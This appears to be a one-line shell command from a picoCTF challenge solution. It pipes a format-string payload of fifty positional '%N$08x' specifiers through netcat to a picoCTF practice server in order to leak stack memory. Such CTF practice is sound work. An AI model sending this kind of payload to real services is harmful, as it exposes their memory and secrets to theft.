(echo 1; for i in {1..50}; do echo -n "%${i}\$08x"; done) | nc mercury.picoctf.net 53437"
